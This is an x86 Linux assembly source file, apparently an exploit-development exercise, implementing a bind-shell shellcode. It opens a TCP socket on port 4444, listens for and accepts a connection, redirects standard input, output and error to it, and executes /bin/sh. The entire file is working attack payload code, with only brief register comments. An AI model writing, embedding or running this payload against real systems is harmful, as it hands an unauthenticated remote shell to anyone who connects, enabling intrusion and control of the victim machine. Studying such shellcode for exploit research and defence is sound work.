section .text
global _start

_start:
	push 0x66
	pop eax		; eax = 0x66 (socketcall)
	
	xor ebx, ebx
	inc ebx		; ebx = 0x1
	
	xor esi, esi	; esi = 0x0
	push esi	; 0 = IPPROTO_IP
	push ebx	; 1 = SOCK_STREAM
	push 0x2	; 2 = AF_INET

	mov ecx, esp	; ecx = args array structure
	int 0x80	; syscall - socket

	xchg edi, eax	; save the file descriptor returned to eax in edi

	xor eax, eax
	mov al, 0x66

	push esi	; esi still 0
	push word 0x5C11; Port 4444

	inc ebx		; ebx was 1 now 2 (AF_INET = 2)
	push bx

	mov ecx, esp	; ecx = args array structure

	push byte 16	; addrlen = 16 bits = 4 bytes (0.0.0.0)
	push ecx	; addr
	push edi	; socketfd
	mov ecx, esp	; ecx = args array for the syscall

	int 0x80	; syscall - bind

	xor eax, eax
	xor ebx, ebx
	mov al, 0x66
	mov bl, 0x4	; type 4 = listen()

	push esi	; backlog = 0
	push edi	; sockfd
	mov ecx, esp	; move args to ecx
	int 0x80	; syscall - listen

	mov al, 0x66
	inc ebx		; type 5 = accept()
	push esi	; NULL
	push esi	; NULL
	push edi	; sockfd
	mov ecx, esp	; move args to ecx
	int 0x80	; syscall - accept()

	xchg ebx, eax	; save the file descriptor in edi

	xor ecx, ecx	; clear ecx
	mov cl, 0x2	; loop count

	loop:
	  mov al, 0x3f	; dup2 syscall
	  int 0x80	; syscall - dup2()
	  dec ecx	; decrement ecx (arg for the file descriptor)
	  jns loop

	mov al, 0x0B	; execve syscall
	push esi	; NULL
	push dword 0x68732f2f
	push dword 0x6e69622f
	mov ebx, esp

	push esi
	push ebx
	mov ecx, esp

	mov edx, esi

	int 0x80
